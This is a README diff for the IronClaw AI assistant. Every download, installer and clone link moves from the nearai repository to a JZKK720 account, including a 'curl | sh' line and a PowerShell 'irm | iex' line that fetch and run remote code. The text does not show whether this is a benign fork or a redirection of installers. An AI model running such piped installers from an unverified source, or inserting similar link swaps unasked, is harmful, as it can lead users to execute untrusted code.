@@ -90,12 +90,12 @@ IronClaw is the AI assistant you can actually trust with your personal and profe
 
 ## Download or Build
 
-Visit [Releases page](https://github.com/nearai/ironclaw/releases/) to see the latest updates.
+Visit [Releases page](https://github.com/JZKK720/ironclaw/releases/) to see the latest updates.
 
 <details>
   <summary>Install via Windows Installer (Windows)</summary>
 
-Download the [Windows Installer](https://github.com/nearai/ironclaw/releases/latest/download/ironclaw-x86_64-pc-windows-msvc.msi) and run it.
+Download the [Windows Installer](https://github.com/JZKK720/ironclaw/releases/latest/download/ironclaw-x86_64-pc-windows-msvc.msi) and run it.
 
 </details>
 
@@ -103,7 +103,7 @@ Download the [Windows Installer](https://github.com/nearai/ironclaw/releases/lat
   <summary>Install via powershell script (Windows)</summary>
 
 ```sh
-irm https://github.com/nearai/ironclaw/releases/latest/download/ironclaw-installer.ps1 | iex
+irm https://github.com/JZKK720/ironclaw/releases/latest/download/ironclaw-installer.ps1 | iex
 ```
 
 </details>
@@ -112,7 +112,7 @@ irm https://github.com/nearai/ironclaw/releases/latest/download/ironclaw-install
   <summary>Install via shell script (macOS, Linux, Windows/WSL)</summary>
 
 ```sh
-curl --proto '=https' --tlsv1.2 -LsSf https://github.com/nearai/ironclaw/releases/latest/download/ironclaw-installer.sh | sh
+curl --proto '=https' --tlsv1.2 -LsSf https://github.com/JZKK720/ironclaw/releases/latest/download/ironclaw-installer.sh | sh
 ```
 </details>
 
@@ -189,7 +189,7 @@ Install it with `cargo`, just make sure you have [Rust](https://rustup.rs) insta
 
 ```bash
 # Clone the repository
-git clone https://github.com/nearai/ironclaw.git
+git clone https://github.com/JZKK720/ironclaw.git
 cd ironclaw
 
 # Build
